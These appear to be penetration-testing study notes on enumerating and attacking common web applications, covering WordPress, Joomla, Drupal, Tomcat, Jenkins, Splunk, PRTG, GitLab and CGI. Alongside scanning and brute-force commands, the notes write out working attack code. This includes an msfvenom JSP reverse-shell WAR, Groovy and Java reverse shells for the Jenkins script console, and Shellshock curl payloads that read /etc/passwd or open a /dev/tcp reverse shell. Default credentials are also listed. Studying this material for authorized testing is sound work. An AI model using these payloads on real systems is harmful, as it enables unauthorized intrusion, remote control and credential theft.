# Application Discovery
**Eyewitness Scan**
Takes XML output from `nmap` and `Nessus` to create a report with screenshots of web apps using Selenium. It'll categorize, fingerprint, and suggest credentials based on application type.

It can also accept a list of IPs and URLs and be told to pre-pend `https://` and `http://` to the front of each.

Here's the [repo](https://github.com/FortyNorthSecurity/EyeWitness) for eyewitness.
```shell
eyewitness --web -x web_discovery.xml -d <output directory>
```

**Aquatone**
Similar to eyewitness, can take screenshots when provided a `.txt` of hosts or an `nmap` `.xml` file with the `-nmap` flag.

Here's the [repo](https://github.com/shelld3v/aquatone) for aquatone.
```shell
cat web_discovery.xml | ./aquatone -nmap
```
# Content Management Systems
For all CMS, when enumerating, run:
```shell
curl -s <site> | grep <CMS>
```
### WordPress
Commonly used CMS for blogs and forums. It's highly customizable, is written in PHP, and usually runs on Apache with MySQL as its backend.

**robots.txt**
```shell
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/
```

**User Types**

| User          | Description                                                                         |
| ------------- | ----------------------------------------------------------------------------------- |
| Administrator | Access to everything, including adding/deleting users/posts and editing source code |
| Editor        | Publish and manage posts, including posts of other users                            |
| Author        | Publish and manage their own posts                                                  |
| Contributor   | Can write and manage their own posts, unable to publish                             |
| Subscriber    | Can browse posts and edit their own profile                                         |

Enumeration Using [`WP Scan`](https://github.com/wpscanteam/wpscan):
```shell
sudo gem install wpscan
wpscan -h # help message
sudo wpscan --url <site> --enumerate --api-token <token>
```

We'll need an API token from [`WPVulnDB`](https://wpvulndb.com/), which is used by the scanner for reporting.

**Login Bruteforce**
Two options for `WPScan`, `xmlrpc` and `wp-login`. The former will use the API to make login attempts through `xmlrpc.php`, and is often preferred because it's faster. The latter uses the standard login page.
```shell
sudo wpscan --password-attack xmlrpc -t <threads> -U <user> -P <password list> --url <site>
```

**Finding Vulnerabilities**
Here's a breakdown of WordPress vulnerabilities by source:
- 4% from WordPress
- 89% from plugins
- 7% from themes

\*\* Note that we can use [`waybackurls`](https://github.com/tomnomnom/waybackurls) to look for older versions of a site. If the developers failed to remove the plugin correctly, we might still be able to access the directory it's stored in.
### Joomla
Common CMS used for discussion forums, e-Commerce, and others. Just like WordPress, it's written in PHP and uses MySQL as its backend. It also has many extensions and templates, with 2.5 million sites running Joomla.

**Standard robots.txt for Joomla**
```shell
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

**Enumeration**
The first tool we can use is [`JoomlaScan`](https://github.com/drego85/JoomlaScan), which requires `python2.7`:
```shell
sudo python2.7 -m pip install urllib3
sudo python2.7 -m pip install certifi
sudo python2.7 -m pip install bs4python2.7 joomlascan.py -u <site>
```

The second tool is [`droopescan`](https://github.com/droope/droopescan), which is a plugin based scanner:
```shell
sudo pip3 install droopescan
droopescan scan joomla --url <site>
```

**Brute Force**:
We can use [`jooma-bruteforce`](https://github.com/ajnik/joomla-bruteforce):
```shell
sudo python3 joomla-brute.py -u <site> -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr <user>
```
### Drupal
The last popular CMS we'll be looking at, popular among companies and developers, is Drupal. Once again written in PHP, but this time the backend can be MySQL, PostgreSQL, or even SQLite. It can have themes and modules like WordPress.

We can check version number using:
```shell
curl -s <site>.CHANGELOG.txt
```

[`droopescan`](https://github.com/droope/droopescan) from above works to enumerate a bit too:
```shell
droopescan scan drupal -u <site>
```
# Containers and Software Dev
The same `curl` enumeration from above applies here too
### Tomcat
Open source web server to host apps written in Java. Often not exposed to the internet, much more common in internal assessments. It'll usually be a high value target, with at least one instance being configured with weak or default credentials.

**General Folder Structure**:
```shell
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost
```

The most important of the above is `WEB-INF/web.xml`, which contains deployment information such as routes and classes handling the routes. Any vulnerabilities in the `WEB-INF/classes` folder can lead to total compromise.

The `lib` folder stores JSP pages, which are similar to PHP files on an Apache server.

The `tomcat-users.xml` file is used to allow or disallow access to the `/manager` and `host-manager` admin pages.

After we look through this, we should directory brute force. We can also try using weak credentials such as `tomcat:tomcat` or `admin:admin`.

**WAR File Upload**
The default management interface is available at `/manager/html`. Valid credentials allow us to upload a packaged .WAR file and compromise the app.

A WAR file can be created using a zip utility, and we'll need a JSP web shell. We can simply browse and deploy, then access the file in our browser to trigger the shell.

Generating a WAR file:
```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<host> LPORT=<port> -f war > file.war
```
### Jenkins
Jenkins is a CI server that runs in servlet containers such as Tomcat. It has over 300 plugins and runs on Tomcat port 8080 by default. It also uses port 5000 to attach slave servers and communicate between master and slave.

It's able to use local databases, LDAP, Unix user database, delegate security to a servlet container, or use no authentication. Admins can also allow or disallow users from creating accounts.

By default, the database to store credentials doesn't allow users to register an account. We can access `/login` to recognize the server. The default admin creds are `admin:admin`

**Script Console**
The script console can be accessed at `/script`, allowing users to run Apache [Groovy](https://en.wikipedia.org/wiki/Apache_Groovy) scripts. Here's a way to run an arbitrary command:
```groovy
def cmd = '<command>'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

Here's a quick one line reverse shell:
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP>/<port>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

For Windows hosts:
```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

Java reverse shell
```groovy
String host="<IP>";
int port=<port>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
# Infrastructure and Network Monitoring
### Splunk
Default port is 8000.

Splunk can run code using server side Django apps, REST endpoints, scripted inputs, and alerting scripts. Common RCE on Splunk involves using scripted input.

**RCE With A Custom App**
We can create a custom app to run Python, Batch, Bash, or PowerShell (for Windows) scripts. We can use [this](https://github.com/0xjpuff/reverse_shell_splunk) Splunk reverse shell guide to do so.
### PRTG
Networking monitoring software. Monitors devices and their protocols. These communicate with the main interface using a REST API. Common ports are 80, 443, or 8080.

Default creds: `prtgadmin:prtgadmin`

**Confirming Service Version**:
```shell
curl -s http://<IP>:<port>/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
```

**Exploitation**
PRTG has [26 known vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html) that were assigned CVEs. Of these, only four have easy-to-find public exploit PoCs, two XSS, one DoS, and one authenticated command injection vulnerability. 

Here's a [blog post](https://www.codewatch.org/blog/?p=453) by the author for the command injection vulnerability.
# Customer Service and Configuration Management
### osTicket
There's not much we can do with osTicket in terms of direct exploitation. Our main hope is to find some credentials and access the tickets that staff have with employees. 

We may be able to use these tickets to gain some information about the network we're working with. Sometimes, they may even contain credentials.
### GitLab
The only way to footprint GitLab is to just browse `/help` when logged in. Either we'll have to register an account or use [this](https://www.exploit-db.com/exploits/49821). There's also a [GitHub repo](https://github.com/dpgg101/GitLabUserEnum) for a Python version of the script.

There are only a few serious exploits, affecting GitLab [12.9.0](https://www.exploit-db.com/exploits/48431) and [11.4.7](https://www.exploit-db.com/exploits/49257)as well as GitLab Community Edition [13.10.3](https://www.exploit-db.com/exploits/49821), [13.9.3](https://www.exploit-db.com/exploits/49944), and [13.10.2](https://www.exploit-db.com/exploits/49951).
# Common Gateway Interfaces
A CGI helps web servers render dynamic pages and create a custom response for a user making a request.
![[Pasted image 20241121095902.png]]

CGI scripts are usually kept in the `/CGI-bin` directory on a web server and can be written in C, C++, java, etc. Here's how we can find them:
```shell
# Hunting for CGI Scripts
gobuster dir -u http://<IP>/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

### Tomcat CGI
`CVE-2019-0232` results in RCE, affecting Windows systems that have the `enableCmdLineArguments` feature enabled. Versions `9.0.0.M1` to `9.0.17`, `8.5.0` to `8.5.39`, and `7.0.0` to `7.0.93` of Tomcat are affected.

A CGI servlet enables web servers to communicate with external applications beyond the Tomcat JVM. These apps are usually CGI scripts. 

The `enableCmdLineArugments` setting for the servlet defines whether we can send command line arguments from a query string. If true, the servlet parses the query string and passes it to the CGI script as arguments.

Here's an example of calling `booksearch.cgi` with the argument `fitzgerald`
```http
http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby
```

The vulnerability with this is that the servlet fails to validate command line arguments. For example, an attacker can append `&dir` to a valid command to execute the `dir` on a Windows system. An example of this is:
```HTTP
http://example.com/cgi-bin/hello.bat?&dir
```

To find CGI scripts, we'll need to brute force:
```shell
# Try with extensions such as bat, cmd, py, etc.
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://<IP>:<port>/cgi/FUZZ.<ext>
```

If we encounter an invalid character error when trying to use special characters in our injection, we can bypass this filter by using URL-encoding.
### Shellshock
Most common CGI attack. [`CVE-2014-6271`](https://nvd.nist.gov/vuln/detail/CVE-2014-6271) is simple to exploit and affects Bash 4.3 and below. The vulnerability allows an attacker to exploit how environment variables are saved. The exploit would have the OS execute commands that are in functions stored in an environment variable. 

Here's an example, where "not vulnerable" would be printed :
```shell
env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```

If the system were vulnerable, `y` would be stored. Once imported by running the next command, it'd be executed first. 

Example attack against a CGI script:
```shell
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://<IP>/cgi-bin/access.cgi

# One line reverse shell
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<IP>/<port> 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```
